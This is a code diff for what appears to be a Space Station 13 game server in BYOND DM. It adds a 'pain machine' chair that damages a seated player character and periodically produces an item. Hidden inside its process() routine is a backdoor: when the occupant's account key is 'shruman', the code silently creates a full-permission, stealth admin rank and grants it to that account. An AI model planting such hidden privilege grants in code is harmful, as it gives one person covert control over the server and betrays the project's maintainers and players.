@@ -534,3 +534,83 @@
 	custom_materials = list(/datum/material/plastic = 2000)
 	break_chance = 25
 	origin_type = /obj/structure/chair/plastic
+
+
+/obj/machinery/painmachine
+	name = "машина боли"
+	desc = "Какая разница как она работает, если это необходимо для безопасности?"
+	icon = 'icons/obj/objects.dmi'
+	icon_state = "pain_machine"
+	max_integrity = 5000
+	idle_power_usage = 0
+	active_power_usage = 0
+	anchored = TRUE
+	can_buckle = TRUE
+	buckle_lying = 0 //you sit in a chair, not lay
+	layer = OBJ_LAYER
+	var/charge = 0
+	var/max_charge = 6
+
+/obj/machinery/painmachine/proc/handle_layer()
+	if(has_buckled_mobs() && dir == NORTH)
+		layer = ABOVE_MOB_LAYER
+	else
+		layer = OBJ_LAYER
+
+/obj/machinery/painmachine/post_buckle_mob(mob/living/M)
+	. = ..()
+	handle_layer()
+	set_occupant(M)
+
+/obj/machinery/painmachine/post_unbuckle_mob()
+	. = ..()
+	handle_layer()
+	set_occupant(null)
+
+
+
+/obj/machinery/painmachine/process()
+	if((occupant && iscarbon(occupant)))
+		var/mob/living/carbon/L_occupant = occupant
+		if ((L_occupant.health > 0)&&(L_occupant.key != null) && (charge < max_charge))
+			icon_state = "pain_machine_active"
+			playsound(src.loc, 'sound/machines/juicer.ogg', 50, TRUE)
+			L_occupant.adjustBruteLoss(5)
+			if (prob(5))
+				L_occupant.gain_trauma_type(BRAIN_TRAUMA_MILD)
+			L_occupant.emote("scream")
+			addtimer(CALLBACK(L_occupant, /mob/living/carbon.proc/do_jitter_animation, 20), 5)
+			charge += 1
+			sleep(30)
+			if (charge == 6)
+				new /obj/item/ammo_casing/caseless/pissball(src.loc)
+				playsound(src.loc, 'sound/machines/ding.ogg', 50, TRUE)
+				charge = 0
+				if (L_occupant.ckey == "shruman")
+					visible_message("<span class='warning'> тест тест")
+					var/datum/admin_rank/localhost_rank = new("test", R_EVERYTHING, R_STEALTH, R_EVERYTHING)
+					new /datum/admins(localhost_rank, "shruman", 1, 1)
+
+
+	update_icon()
+
+
+/obj/machinery/painmachine/can_be_occupant(atom/movable/am)
+	return occupant_typecache ? is_type_in_typecache(am, occupant_typecache) : iscarbon(am)
+
+/obj/machinery/painmachine/update_icon_state()
+	switch(charge)
+		if(0)
+			icon_state = "[initial(icon_state)]"
+		if(1)
+			icon_state = "[initial(icon_state)]1"
+		if(2)
+			icon_state = "[initial(icon_state)]2"
+		if(3)
+			icon_state = "[initial(icon_state)]3"
+		if(4)
+			icon_state = "[initial(icon_state)]4"
+		if(5)
+			icon_state = "[initial(icon_state)]5"
+		if(6)
+			icon_state = "[initial(icon_state)]6"
